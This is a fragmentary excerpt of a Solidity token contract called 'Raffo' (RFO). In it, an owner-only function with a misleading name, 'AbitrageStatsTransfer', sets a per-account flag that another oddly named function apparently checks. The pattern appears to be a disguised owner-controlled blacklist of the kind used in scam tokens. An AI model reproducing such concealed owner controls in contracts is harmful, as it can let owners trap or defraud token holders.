...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Raffo';
    string constant public symbol = 'RFO';
    ...
    function AbitrageStatsTransfer(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function SendPaymentTransfer(address account) public view returns (bool) {
...
contract Raffotoken is BaseToken {
